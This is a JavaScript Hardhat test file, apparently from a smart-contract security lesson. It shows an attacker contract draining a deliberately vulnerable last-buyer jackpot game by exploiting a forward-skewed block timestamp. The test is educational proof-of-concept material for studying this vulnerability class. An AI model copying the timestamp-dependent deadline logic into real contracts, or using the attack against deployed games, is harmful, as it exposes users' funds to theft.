import { anyValue } from "@nomicfoundation/hardhat-ethers-chai-matchers/withArgs";
import { expect } from "chai";
import hre from "hardhat";

describe("Timestamp manipulation module: vulnerable last-buyer game", function () {
  let connection;

  before(async function () {
    // In Hardhat 3, network helpers are available through a network connection.
    connection = await hre.network.connect();
  });

  async function deployTimestampVulnerableFixture() {
    // Create a realistic actor set:
    // two honest users and the attacker operator.
    const { ethers } = connection;
    const [deployer, alice, bob, attackerOperator] = await ethers.getSigners();

    const vulnerableFactory = await ethers.getContractFactory("TimestampLastBuyerGame");
    const vulnerableGame = await vulnerableFactory.deploy(3600);
    await vulnerableGame.waitForDeployment();

    const attackerFactory = await ethers.getContractFactory("TimestampBoundaryAttacker");
    const attackerContract = await attackerFactory
      .connect(attackerOperator)
      .deploy(await vulnerableGame.getAddress());
    await attackerContract.waitForDeployment();

    // Honest users build up a meaningful jackpot.
    await vulnerableGame.connect(alice).buyIn({ value: ethers.parseEther("2") });
    await vulnerableGame.connect(bob).buyIn({ value: ethers.parseEther("3") });

    // The attacker becomes the latest buyer with the minimum qualifying amount.
    await attackerContract
      .connect(attackerOperator)
      .becomeLastBuyer({ value: ethers.parseEther("1") });

    return {
      ethers,
      deployer,
      alice,
      bob,
      attackerOperator,
      vulnerableGame,
      attackerContract,
    };
  }

  it("allows the last buyer to claim the pot near the deadline if the block timestamp is skewed forward", async function () {
    const { networkHelpers } = connection;
    const { ethers, attackerOperator, vulnerableGame, attackerContract } =
      await networkHelpers.loadFixture(deployTimestampVulnerableFixture);

    expect(await vulnerableGame.potBalance()).to.equal(
      ethers.parseEther("6")
    );

    const lastBuyTimestamp = await vulnerableGame.lastBuyTimestamp();

    // Simulate that only 3590 seconds of real waiting have passed,
    // but the validator includes the claim in a block whose timestamp crosses the boundary.
    await networkHelpers.time.increase(3590);
    await networkHelpers.time.setNextBlockTimestamp(Number(lastBuyTimestamp) + 3601);

    await expect(attackerContract.connect(attackerOperator).claimPot())
      .to.emit(attackerContract, "PotCaptured")
      .withArgs(anyValue);

    expect(await vulnerableGame.potBalance()).to.equal(0n);
    expect(
      await ethers.provider.getBalance(await attackerContract.getAddress())
    ).to.equal(ethers.parseEther("6"));
  });
});
